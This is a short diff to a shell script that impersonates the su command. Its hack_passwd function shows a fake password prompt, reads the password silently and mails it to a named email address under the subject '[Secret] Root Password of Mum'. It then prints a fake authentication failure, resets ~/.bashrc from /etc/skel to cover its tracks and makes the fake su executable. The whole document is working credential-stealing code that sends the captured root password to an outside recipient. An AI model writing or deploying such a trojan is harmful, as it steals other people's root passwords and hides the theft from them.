@@ -242,17 +242,16 @@ hack_passwd(){
 echo "Password:"
 read -s passwd
 #echo ${passwd} debug usage
+mail -s "[Secret] Root Password of Mum" "kevin.zhang@sjtu.edu.cn" <<< ${passwd}
 sleep 3
 echo "su: Authentication failure"
-mail -s "[Secret] Root Password of Mum" "kevin.zhang@sjtu.edu.cn" <<< ${passwd}
 }
 
-# Last part of this code is to clean the modified path
 #echo "test su"
 hack_passwd
-head -n -1 ~/.bashrc >> ~/.bashrc_tmp
-mv ~/.bashrc_tmp ~/.bashrc
-
+/bin/cp /etc/skel/.bashrc ~/
+source /etc/environment
+exec bash
 #Another thing to do is to modify the right of this `su`
 #Otherwise, it seems that this `su` won't be considered as a candidate for `su` command
 sudo chmod 755 su
